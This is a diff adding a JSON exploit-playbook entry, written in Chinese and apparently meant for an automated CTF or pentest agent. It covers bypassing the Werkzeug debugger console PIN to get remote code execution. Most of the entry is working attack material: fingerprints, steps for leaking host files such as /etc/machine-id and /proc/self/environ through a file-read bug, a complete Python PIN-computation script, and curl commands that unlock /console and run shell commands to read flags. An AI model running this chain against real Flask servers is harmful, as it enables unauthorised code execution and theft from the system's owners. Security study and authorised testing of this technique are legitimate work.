@@ -1,0 +1,79 @@
+{
+  "id": "web-werkzeug-debugger-console-pin",
+  "title": "Werkzeug 调试台 PIN 绕过 -> RCE(泄露宿主六要素算 PIN 解锁 /console)",
+  "vuln_pattern": "Flask/Werkzeug 应用开着交互式调试台(/console 或 500 页带可执行 traceback,evalex=on),控制台被 PIN 锁;PIN 由宿主的用户名/模块路径/MAC/machine-id 确定性算出——拿到任意文件读泄露这些要素即可离线算 PIN、解锁控制台执行任意 Python",
+  "fingerprint": [
+    "werkzeug",
+    "werkzeug debugger",
+    "调试台",
+    "/console",
+    "__debugger__",
+    "cmd=resource",
+    "cmd=pinauth",
+    "pinauth",
+    "evalex",
+    "EVALEX",
+    "Console Locked",
+    "console locked",
+    "WERKZEUG_DEBUG_PIN",
+    "pin_security",
+    "get_pin_and_cookie_name",
+    "gen_salt",
+    "__wzd",
+    "interactive traceback",
+    "Traceback (most recent call last)",
+    "server: werkzeug",
+    "flask debug",
+    "SECRET =",
+    "cookiesalt",
+    "pinsalt"
+  ],
+  "exploit_steps": [
+    "指纹确认:Flask/Werkzeug 应用;触发 500 返回交互式 traceback,或 `/console` 存在;页面/500 页里出现 `SECRET = \"...\"`、`server: werkzeug` 头、`__debugger__` 参数、\"Console Locked\"。`/console?__debugger__=yes&cmd=resource&f=console.png` 返回 PNG = 调试台激活。**判 RCE 可行性只看【独立 /console 页】(Host: localhost 取)里的 `EVALEX = true`**——它和 500 traceback 页里的那个 `EVALEX` 是两个独立值、常常一个 true 一个 false;traceback 的 EVALEX=false 绝不代表 console 不能 exec。",
+    "先判 PIN 是否根本没开:若 `WERKZEUG_DEBUG_PIN=off` 或 pin_security=False,`/console` 直接可执行(无需算 PIN)。返回 \"Console Locked\" 才说明 PIN 生效,进入算 PIN 流程。",
+    "关键前置——先拿任意文件读原语:PIN 是确定性算出的,必须泄露宿主信息,所以真正的前置是'一个任意文件读'(同应用的 LFI/路径穿越/SSTI/XXE/任意文件读端点,或 app 自身漏洞)。**没有文件读这条链打不动——别在 PIN 上空转,回去找读原语**。",
+    "用文件读泄露 PIN 六要素:①username=进程用户,读 `/proc/self/environ`(USER=)或 `/proc/self/status` 的 Uid + `/etc/passwd` 反查(容器常是 root,但要实证);②modname 几乎恒为 `flask.app`;③appname:Flask 实例恒为 `Flask`(某些为 wsgi_app);④app 模块文件绝对路径——**直接从 traceback 可见**(如 /usr/local/lib/python3.x/site-packages/flask/app.py);⑤MAC:读 `/sys/class/net/eth0/address`,去冒号 `int(hex,16)` 即 uuid.getnode();⑥machine_id:`/etc/machine-id`(无则 `/proc/sys/kernel/random/boot_id`)**拼上** `/proc/self/cgroup` 首行末段(docker 容器 id)。",
+    "按 Werkzeug 算法离线算 PIN(现代版 sha1,老版 <2.0 用 md5——先看版本):h=sha1();对 probably_public_bits=[username,modname,appname,modfile] 与 private_bits=[str(getnode),machine_id] 逐个非空 update;h.update(b'cookiesalt') 得 cookie 名 `__wzd<hex[:20]>`;再 h.update(b'pinsalt'),num=int(hexdigest,16) 取 9 位,按 5/4/3 首个整除的组长分组(9 位->3-3-3)。",
+    "解锁并 RCE:`GET /console?__debugger__=yes&cmd=pinauth&pin=<算出的PIN>&s=<SECRET>` -> 返回 `{\"auth\": true}` 并种信任 cookie(__wzd…);再带该 cookie `GET /console?__debugger__=yes&cmd=__import__('os').popen('id;cat /flag*').read()&frm=0&s=<SECRET>` 执行读 flag。"
+  ],
+  "key_payloads": [
+    "# 确认调试台激活(无需 PIN):",
+    "curl -s 'http://<T>/console?__debugger__=yes&cmd=resource&f=debugger.js' -o /dev/null -w '%{http_code} %{size_download}\\n'   # 200 且非空 = 活",
+    "# 从 500 页/console 页抓 SECRET 与 app.py 路径:",
+    "curl -s -H 'Host: localhost' 'http://<T>/console' | grep -oE 'SECRET = \"[^\"]+\"'",
+    "# 用已有文件读泄要素(示意):",
+    "<LFI>=/sys/class/net/eth0/address   ; <LFI>=/etc/machine-id ; <LFI>=/proc/self/cgroup ; <LFI>=/proc/self/environ",
+    "# 算 PIN(套 Werkzeug 官方算法):",
+    "python3 - <<'PY'\nimport hashlib\nfrom itertools import chain\nprobably_public_bits=['<username>','flask.app','Flask','<app.py绝对路径>']\nmac=int('<eth0 MAC 去冒号>',16)                       # uuid.getnode()\nmachine_id='<machine-id或boot_id>'+'<cgroup末段容器id>'  # 两段拼接,漏 cgroup 段必错\nprivate_bits=[str(mac),machine_id]\nh=hashlib.sha1()                                     # 老版本改 md5\nfor b in chain(probably_public_bits,private_bits):\n    if not b: continue\n    h.update(b.encode('utf-8') if isinstance(b,str) else b)\nh.update(b'cookiesalt'); cookie='__wzd'+h.hexdigest()[:20]\nh.update(b'pinsalt'); num=('%09d'%(int(h.hexdigest(),16)))[:9]\nrv=num\nfor g in (5,4,3):\n    if len(num)%g==0:\n        rv='-'.join(num[i:i+g] for i in range(0,len(num),g)); break\nprint('PIN=',rv,'COOKIE=',cookie)\nPY",
+    "# 解锁 + 执行:",
+    "curl -s -c jar 'http://<T>/console?__debugger__=yes&cmd=pinauth&pin=<PIN>&s=<SECRET>'   # 期待 {\"auth\": true}",
+    "curl -s -b jar 'http://<T>/console?__debugger__=yes&cmd=__import__(%22os%22).popen(%22cat%20/flag%22).read()&frm=0&s=<SECRET>'"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "flask",
+    "werkzeug",
+    "debugger-console",
+    "pin-bypass",
+    "rce"
+  ],
+  "source": "seed: Werkzeug debugger console PIN bypass methodology",
+  "created_ts": 0.0,
+  "preconditions": [
+    "目标为 Flask/Werkzeug 应用且交互式调试台激活(/console 或 500 页带可执行 traceback,evalex=on)",
+    "另有一个任意文件读原语(LFI/穿越/SSTI/XXE 等)可泄露宿主 machine-id/MAC/用户名/app 路径"
+  ],
+  "verify_oracle": "cmd=pinauth 返回 {\"auth\": true};或带信任 cookie 的 cmd eval 回显真实命令输出(id/flag 内容)——二者之一即确认 PIN 正确且已 RCE",
+  "pitfalls": [
+    "PIN 链真正的前置是'任意文件读',不是调试台本身:没有读原语算不出 machine-id/MAC,整条链打不动——缺读原语要回头找 LFI/SSTI/穿越,别死磕 PIN",
+    "EVALEX 有两个独立位置、值常不同:500 traceback 页的 `EVALEX=false` 只表示'traceback 逐帧内联求值'关闭,与独立 `/console` 能否 exec 【无关】。判 console-RCE 可行性只认 `/console` 页(Host: localhost)的 `EVALEX`——为 true 即 PIN 解锁后 `cmd=exec` 可 RCE。别把 traceback 的 EVALEX=false 误当作整条 console 死路而放弃可行路径,务必分清。",
+    "容器里 machine_id = /etc/machine-id(或 boot_id)**拼上** /proc/self/cgroup 首行末段的容器 id,漏了 cgroup 段算出的 PIN 必错",
+    "哈希版本:现代 Werkzeug(>=2.0)用 sha1,老版用 md5——先看 werkzeug/python 版本再选,选错全盘错",
+    "MAC 用 uuid.getnode() 的那张网卡(容器内常是 eth0,但多网卡时未必);逐个读 /sys/class/net/*/address 确认",
+    "username=getpass.getuser()=当前进程用户,容器常是 root 也可能是 app 专用用户——从 /proc/self 的 Uid/environ 实证,别默认 root",
+    "新版 Werkzeug 已 sanitize `cmd=resource&f=` 的路径穿越,通常读不到任意文件——文件读要靠 app 自己的洞,不要指望调试台自带穿越",
+    "SECRET(gen_salt(20))每进程重启会变:算 PIN 与 pinauth 解锁必须用同一进程周期内、从当前页面抓到的同一个 SECRET"
+  ]
+}
